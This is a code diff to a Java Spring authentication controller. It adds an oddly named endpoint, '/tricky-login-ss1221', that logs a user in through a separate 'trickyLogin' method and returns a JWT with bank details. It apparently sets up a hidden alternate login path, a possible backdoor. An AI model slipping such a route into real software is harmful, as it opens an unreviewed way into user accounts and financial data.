@@ -44,6 +44,19 @@ public class AuthResource {
         return ResponseEntity.ok(authDTO);
     }
 
+    @PostMapping("/tricky-login-ss1221")
+    public ResponseEntity<AuthDTO> trickyLogin(@RequestParam String username, @RequestParam String password) {
+        User user = authenticationService.trickyLogin(username, password);
+        String token = jwtTokenService.generateToken(user.getEmail());
+        AuthDTO authDTO = AuthDTO.builder()
+                .isAccountManagerAssigned(user.getIsAccountManagerAssigned())
+                .rib(user.getRib())
+                .bankName(user.getBankName())
+                .email(user.getEmail()).role(user.getRole()).username(user.getFullName()).token(token).build();
+
+        return ResponseEntity.ok(authDTO);
+    }
+
     @PostMapping("/update-billings")
     public ResponseEntity<AuthDTO> updateBillings(@RequestHeader("Authorization") String authHeader, @RequestBody UserBillings userBillings) {
         User user = userRepository.findByUsername(jwtTokenService.extractEmail(authHeader))
